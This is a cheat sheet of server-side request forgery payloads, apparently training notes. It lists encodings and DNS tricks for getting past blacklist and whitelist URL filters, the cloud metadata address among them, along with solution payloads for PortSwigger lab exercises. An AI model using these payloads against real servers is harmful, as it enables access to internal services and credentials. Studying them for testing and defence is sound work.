# Basic Information  
Server-side Request Forgery (SSRF) vulnerability occurs when an attacker manipulates a server-side application into making HTTP requests to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.

## Bypass blacklist-based
Insted of `127.0.0.1`
```python
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```

## Whitelist-based
- Embed credentials in a URL before the hostname, using the `@` character.  
```
https://expected-host:fakepassword@evil-host
```
- Use the `#` character to indicate a URL fragment.  
```
https://evil-host#expected-host
```
- Leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control.
```
https://expected-host.evil-host
```
- URL-encode and double-encoding

### Labs Portswigger
1. Basic SSRF against another back-end system  
```
stockApi=http://192.168.0.$1$:8080/admin
```
2. Blind SSRF with out-of-band detection  
```
Referer: http://burpcollaborator
```
3. SSRF with blacklist-based input filter  
```
stockApi=http://127.1/%2561dmin/
```
4. SSRF with filter bypass via open redirection vulnerability  
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
5. SSRF with whitelist-based input filter  
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
```
6. Admin panel - Download report as PDF SSRF  
```
<iframe src='http://localhost:6566/secret' height='500' width='500'>
```
